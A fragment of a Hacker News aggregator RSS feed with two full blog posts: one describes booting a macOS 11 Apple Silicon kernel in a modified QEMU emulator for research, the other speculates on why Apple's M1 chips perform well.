<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/e47219f7aa-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>7</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064721</guid>
            <pubDate>Thu, 12 Nov 2020 00:24:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Booting a macOS Apple Silicon Kernel in QEMU]]>
            </title>
            <description>
<![CDATA[
Score 254 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25064593">thread link</a>) | @empyrical
<br/>
November 11, 2020 | https://worthdoingbadly.com/xnuqemu3/ | <a href="https://web.archive.org/web/*/https://worthdoingbadly.com/xnuqemu3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I booted the arm64e kernel of macOS 11.0.1 beta 1 kernel in QEMU up to launchd. It’s completely useless, but may be interesting if you’re wondering how an Apple Silicon Mac will boot.</p>

<h2 id="howto">Howto</h2>

<p>This is similar to my previous guide on running <a href="https://worthdoingbadly.com/xnuqemu2/">iOS kernel in QEMU</a>:</p>

<ul>
  <li>install macOS 11.0.1 beta 1 (20B5012D)</li>
  <li>run <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh"><code>build_arm64e_kcache.sh</code></a> to create an Apple Silicon Boot Kext Collection</li>
  <li>build the modified QEMU:
    <div><div><pre><code>git clone https://github.com/zhuowei/qemu
cd qemu
git checkout a12z-macos
mkdir build
cd build
../configure --target-list=aarch64-softmmu
make
</code></pre></div>    </div>
  </li>
  <li>create a modified device tree by running <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">DTRewriter</a> on <a href="https://updates.cdn-apple.com/2020SummerSeed/fullrestores/001-30235/6D8C0CA3-5952-4FD8-AEB3-4B4CADB626BC/iPad8,11,iPad8,12_14.0_18A5332f_Restore.ipsw">iPad Pro firmware</a>:
    <div><div><pre><code>python3 extractfilefromim4p.py Firmware/all_flash/DeviceTree.j421ap.im4p DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree
java DTRewriter DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb
</code></pre></div>    </div>
  </li>
  <li>run QEMU:
    <div><div><pre><code>./aarch64-softmmu/qemu-system-aarch64 -M virt -cpu max \
  -kernel /path/to/bootcache-arm64e \
  -dtb /path/to/DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb  \
  -monitor stdio -m 6G -s -S -d unimp,mmu \
  -serial file:/dev/stdout -serial file:/dev/stdout -serial file:/dev/stdout \
  -append "-noprogress cs_enforcement_disable=1 amfi_get_out_of_my_way=1 nvram-log=1 debug=0x8 kextlog=0xffff io=0xfff serial=0x7 cpus=1 rd=md0 apcie=0xffffffff" \
  -initrd /path/to/ios14.0b3/ramdisk.dmg $@
</code></pre></div>    </div>
  </li>
  <li>run gdb with <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/bootit.gdbscript">this script</a>:
    <div><div><pre><code>~/Library/Android/sdk/ndk/21.0.6113669/prebuilt/darwin-x86_64/bin/gdb \
-D /any/emptydir \
-x bootit.gdbscript
</code></pre></div>    </div>
    
  </li>
</ul>

<p>And the macOS kernel will <a href="https://gist.github.com/zhuowei/5aa668e76f387374cd56848313aa2197">boot into launchd</a>.</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p><img src="https://worthdoingbadly.com/assets/blog/xnuqemu3/wwdc2018_no.jpg" alt="&quot;No.&quot; - Craig Federighi, WWDC 2018"></p>

<p>No:</p>

<ul>
  <li>Absolutely nothing is supported: literally only the kernel and the serial port works, not even the userspace since there’s no disk driver</li>
  <li>Userspace is instead borrowed from iOS 14 b3</li>
  <li>This will never boot anything close to graphical macOS UI</li>
  <li>Most importantly, even if I ever managed to fully boot the macOS kernel, emulating macOS is useless anyways.</li>
</ul>

<p>There are only three reasons I can think of for emulating macOS: security research, software development without a real Apple Silicon machine, and Hackintoshing. This approach will help with none of these:</p>

<ul>
  <li>Emulating iOS is useful for security research when jailbreak is not available. Apple Silicon Macs already support kernel debugging.</li>
  <li>Not useful for software dev: QEMU’s CPU emulation doesn’t support Apple Silicon-specific features, such as Rosetta’s memory ordering or the APRR JIT.</li>
  <li>as for Hackintosh: macOS uses CPU instructions that aren’t available yet on non-Apple ARM CPUs, so you can’t have hardware accelerated virtualization, only very slow emulation. Besides, Hackintoshes are often built when Apple’s own hardware isn’t fast enough; in this case, Apple’s ARM processors are already some of the fastest in the industry.</li>
</ul>

<p>I researched this this not because it’ll be practical, but only to understand how an Apple Silicon Mac works. This will never be a <a href="https://www.youtube.com/watch?v=1AtE54HpXBM">Time Train</a>: only a <a href="https://youtu.be/UswpJh6Zvd8?t=119">science experiment</a>.</p>

<h2 id="what-i-did">What I did</h2>

<h2 id="create-kext-collection">Create kext collection</h2>

<p>On iOS, the kernel and its Kexts are packed together into a bootable file called the <strong>Kernel Cache</strong>.</p>

<p>macOS 11 uses an evolved version of this format, called the <strong>Boot Kext Collection</strong>.</p>

<p>Like the iOS kernelcache, it contains all Kexts required for booting, so the bootloader only needs to load it into memory and jump into it.</p>

<p>To create a boot kext collection, macOS 11 introduces the <a href="https://developer.apple.com/documentation/kernel/installing_a_custom_kernel_extension?language=objc"><code>kmutil</code></a> tool.</p>

<p>Here’s <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh">my script</a> to get <code>kmutil</code> to generate an arm64e kext collection.</p>

<p>It manually excludes some kexts because they cause kmutil to error out. Most are because they depend on ACPI, which is not available on Apple Silicon. I made a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/printexcludekexts.sh">script</a> to detect them.</p>

<p>Debugging <code>kmutil</code> failures on macOS 11 beta 3 was easy because it dumped out the entire NSError message. However, on macOS 11.0.1 beta, Apple decided to hide the full error message and only print an error code. I had to disable SIP and put a breakpoint on <code>swift_errorRetain</code> to get at the underlying error.</p>

<p>Once the <code>build_arm64e_kcache.sh</code> runs, a Boot Kext Collection is created at <code>~/kcache_out/bootcache-arm64e</code>, which can be booted in QEMU.</p>

<h2 id="disassembling-the-boot-kext-collection">Disassembling the boot kext collection</h2>

<p>For debugging, I also had to disassemble the newly created Boot Kext Collection in Ghidra.</p>

<p>Unfortunately, Ghidra isn’t updated for macOS 11 and will refuse to load the file, first giving an error about XML DOCTYPE, then - once that’s worked around - an <a href="https://github.com/NationalSecurityAgency/ghidra/issues/2192">IOException</a> from the invalid <code>ntools</code> value in the <code>LC_BUILD_VERSION</code> load command.</p>

<p>I created a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/patch_boot_kext_collection_for_ghidra.py">script</a> to fix up the kext collection so that Ghidra can load it.</p>

<p>Note that this is still not perfect - Ghidra still doesn’t fixup pointers or read symbols.</p>

<p>To get method names, I also disassembled the raw kernel file (<code>/System/Library/Kernels/kernel.release.t8020</code>) for cross reference. Note that the raw kernel is based at a different address - you can either rebase it in Ghidra, or just be careful to convert addresses.</p>

<h2 id="disable-pac">Disable PAC</h2>

<p>I already had a <a href="https://worthdoingbadly.com/xnuqemu2/">modified QEMU to boot an iOS kernel</a> (which has inspired others, such as <a href="https://alephsecurity.com/">Aleph Security</a>, to build much better open-source iOS emulation platforms)</p>

<p>In early 2019 I updated my modified QEMU to work with PAC for the iPhone Xs/Xr.</p>

<p>QEMU by that time already supported PAC instructions; however, Apple <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">modified</a> the crypto algorithm when implementing PAC, so the kernel fails to boot.</p>

<p>I decided to instead <a href="https://github.com/zhuowei/qemu/commit/16613b67ad15a902791109077ebfb1091f1873aa">turn PAC instructions</a> into no-ops, since I don’t know how Apple’s algorithm worked. This also makes it easier to debug the kernel.</p>

<p>Since the macOS DTK used an A12z processor, the modified QEMU just worked.</p>

<h2 id="device-tree">Device tree</h2>

<p>Like iOS, macOS on Apple Silicon uses a <strong>device tree</strong> to describe hardware to the kernel, and to pass boot arguments.</p>

<p>macOS 11.0.1 beta’s installer doesn’t contain a device tree for the DTK: I suspect it would be in the .ipsw files, which are not publically available. Instead, I borrowed the iPad Pro’s device tree from iOS 14 beta 3.</p>

<p>Like the <a href="https://worthdoingbadly.com/xnuqemu2/">iOS in QEMU experiments</a>, I first disabled every piece of hardware in the device tree except the serial port.</p>

<p>Unlike iOS, macOS expects some more information in the device tree:</p>
<ul>
  <li>ram size (since Macs have upgradeable RAM)</li>
  <li>nvram, otherwise panics with a null pointer while reading nonce-seed. (I copied nvram from <a href="https://gist.github.com/bazad/1faef1a6fe396b820a43170b43e38be1">bazad’s dump of an iPhone device tree</a>.)</li>
  <li>AMCC (KTRR) register positions</li>
  <li>System Integrity Protection status</li>
</ul>

<p>I rewrote my <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">device tree editor</a> to allow populating these extra params.</p>

<h2 id="up-to-launchd">Up to launchd</h2>

<p>I can’t actually boot a macOS root filesystem as I don’t have an emulated hard disk.</p>

<p>I don’t have a recovery ramdisk either: that would likely only be included in the DTK IPSW, which is not public.</p>

<p>Instead, I decided to boot with an iOS ramdisk to test the kernel, and disable signature checking using a GDB breakpoint.</p>

<p>I also couldn’t get the trustcache (list of executables trusted by the kernel) to load. I tried following <a href="https://alephsecurity.com/2019/06/25/xnu-qemu-arm64-2/">Aleph Security’s guide</a>, but macOS 11 is more strict than iOS 12 and needs it below the kernel; I couldn’t figure out the correct memory address.</p>

<h2 id="why-it-took-so-long">Why it took so long</h2>

<p>I actually had this blog post ready since <a href="https://gist.github.com/zhuowei/27816d39f234468cf2956479c0dea7ad">August 9th</a>, but I spent an extra 3 months trying to fix issues, since I really wanted to at least get to a shell!</p>

<p>Unfortunately:</p>
<ul>
  <li>debugging why drivers wasn’t loading was hard</li>
  <li>I couldn’t disable signature checking properly</li>
  <li>I wanted to wait until Apple released an A14 kernel instead of the DTK’s A12, so that we can look at how virtualization works, but they never did</li>
</ul>

<p>It’s now November 9th and Apple’s holding their press conference tomorrow: so it’s <a href="https://www.youtube.com/watch?v=9tAbhrDUrqM">now or never</a>.</p>

<h2 id="whats-left">What’s left</h2>

<p>I’m probably not going to be working further on this, but here’s what one can do to make this an actual useful research platform:</p>

<ul>
  <li>Figure out why half the drivers aren’t loading at all</li>
  <li>Write basic drivers/emulations:
    <ul>
      <li>probably emulate AIC in QEMU (based on Project Sandcastle’s Linux driver) since a custom interrupt controller Kext would be hard to write</li>
      <li>port Apple’s old <a href="https://opensource.apple.com/source/AppleMacRiscPCI/AppleMacRiscPCI-3.4/AppleMacRiscPCI.cpp.auto.html">PowerPC PCIE</a> drivers, since it’s too hard to emulate the Apple Silicon PCIE controller. This will allow us to connect a virtual hard drive.</li>
    </ul>
  </li>
  <li>Switch to the A14 kernel when Apple releases Apple Silicon Macs, so we can test virtualization</li>
</ul>

<h2 id="what-i-learned">What I learned</h2>

<ul>
  <li>How to modify QEMU to disable PAC</li>
  <li>How iBoot on Apple Silicon passes boot options in the device tree</li>
  <li>How to generate an Apple Silicon kernel cache without an Apple Silicon Mac</li>
  <li>How to fight <code>kmutil</code> for the real error message</li>
  <li>Never procrastinate on a blog post for three months</li>
</ul>

  </div>
</article>

      </div>
      
    </div></div>]]>
            </description>
            <link>https://worthdoingbadly.com/xnuqemu3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064593</guid>
            <pubDate>Thu, 12 Nov 2020 00:09:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overlooked source of Apple M1 performance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064570">thread link</a>) | @kwiromeo
<br/>
November 11, 2020 | https://kwiromeo.com/explaining-apple-m1-products-performance/ | <a href="https://web.archive.org/web/*/https://kwiromeo.com/explaining-apple-m1-products-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>When watching <a href="https://youtu.be/5AwdkGKmZ0I">Apple's Arm laptops</a> event, I couldn't help but wonder: where is all that performance coming from? During the event, there were two key points (that are not obvious, IMHO), that further explain where they are getting all that extra performance from.</p><p>But first, let's mention the obvious stuff, that plenty of analysts will anchor on, and that are valid:</p><ul><li><strong>More transistors is better</strong>: 5nm process allows more transistors in a chip. More transistors = more instructions processed = faster performance</li><li><strong>Small means low power consumption:</strong> 5nm process allows for lower power consumption. This is because, at that size, the transistor can operate between 0.7V - 1.2V per transistor[<a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">1</a>] (instead of 1V - 1.35V)[<a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">2</a>]. At the numbers of billions of transistors, a small voltage difference means a lot for battery consumption.</li><li><strong>Specialized hardware gives an edge</strong>: Accelerators (like the neural engine) allow the Mac to offload specific tasks to another core, which leaves the main processor, M1 to do the work that is less specific (like compiling your code from XCode 😉 )</li></ul><h2 id="unified-memory-architecture-or-making-friends-with-physics-">Unified Memory Architecture (or Making Friends with Physics)</h2><p>When I was transitions careers to become a software developer, I came across this post about latency numbers of common computer components ( a link at <a href="http://norvig.com/21-days.html#answers">Peter Norvig post about it</a>), it occurred to me that all these numbers were proportional to the distance between the CPU and the location of the data. The further the electrons need to travel, the more time they will take. This is a massive oversimplification but illustrates the point well. There are other details to take into account as well. &nbsp;The one that comes to mind is that having the electrical signal only traveling though the SoC instead of the printed circuit board, avoid a lot of signal conditioning that would need to happen to keep signal integrity. Apple brought all their chips closer, which reduced the amount of travel time for every critical signal, as well as reduced the number of medium transitions (from an integrated circuit to a printed circuit board, back to an integrated circuit) as shown in the figure below. This results in higher data access speed by the CPU and the GPU, which translates to a faster experience for the end-user.</p><figure><img src="https://kwiromeo.com/content/images/2020/11/apple_m1_soc_vs_logic_board.jpg" alt="sketch of a logic board with separate chips compared to an apple M1 SoC"><figcaption>Showing the reduced distance of signal traveling for a logic board vs. a SoC :-)&nbsp;</figcaption></figure><h2 id="avoid-unnecessary-copies-or-the-gospel-by-a-c-performance-engineer-">Avoid Unnecessary Copies (or the gospel by a C++ performance engineer)</h2><p>In my year of learning and using C++, I've learned that (unnecessary) copies are bad, and Craig Federighi also knows this. During the presentation, he says</p><blockquote>"We built macOS on Apple Silicon to use the same data formats for things like video decode, GPU and display, so there's no need for expensive copying or translation"</blockquote><p>Why are copies they bad? This has to do with what happens when an object is copied. Here's a simple way to look at the process. Whenever a program issues a copy command, then the CPU needs to:</p><ul><li>read the memory location of the data,</li><li>then reserve memory where the data will be copied</li><li>then copy the data</li><li>then decide what to do with the original data</li></ul><p>When the source of the data copied remains, then the CPU is done. However, when the source data needs to be deleted, then there's the additional step of de-allocating memory space so that other instructions can use it. This problem is sometimes caught by the compiler, whenever possible, and performs an optimization called <a href="https://en.wikipedia.org/wiki/Copy_elision">copy elision</a> whenever it is obvious that a copy is unnecessary. However, while <a href="https://youtu.be/bSkpMdDe4g4">compilers are awesome</a>, they can't undo a programmer's lack of optimization knowledge. One solution that the C++ community found useful, is that we can help the compiler by specifying when copies are not needed. Since C++ 14, programmers can also tell the compilers that we don't need to go through a deep copy, instead, use a command <code>std::move</code>, which does the magic of not destroying and recreate the same thing. This saves CPU cycles, and improves performance.</p><p>From the Apple M1 MacBook presentation, Apple makes the above behavior default: <strong>instead of having the programmer choose between copying or reusing data, reuse of the data is the default</strong>. This makes the efficient behavior to be the default, and save programs from being slowed down by unnecessary copies</p><h2 id="things-i-may-have-missed-and-things-i-don-t-know-about-">Things I May Have Missed (and Things I Don't Know About)</h2><p>The above is a simplified view of the programming model of Apple's new M1 chip. By not having programmed for one, the above is my best guess at how the items noted in the keynote mentions would translate in hardware and software. It's possible that Apple simplified the programming paradigm of CPU vs GPU programming by obfuscating calls to GPU instructions in the macOS APIs. If all the hardware is one the same chip, the programmer doesn't need to know what sub-chip (CPU, GPU, Neural Engine, etc...) is doing the job, but just that the chip (M1) is doing it. From there, the job is for compiler optimization to take over, and make the best decision as to which sub-chip needs to process the instruction.</p><p>—</p><p>PS: if someone who knows the nitty gritty details of this, hit me up <a href="https://twitter.com/kwiromeo">@kwiromeo</a> on twitter. I would love to learn more about this.</p><hr><p>[1] AnandTech - <a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">Early TSMC 5nm Test Chip Yields 80%, HVM Coming in H1 2020</a></p><p>[2] AnandTech - <a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">What Products Use Intel 10nm? SuperFin and 10++ Demystified</a></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://kwiromeo.com/explaining-apple-m1-products-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064570</guid>
            <pubDate>Thu, 12 Nov 2020 00:06:27 GMT</pubDate>
        </item>
    </channel>
</rss>
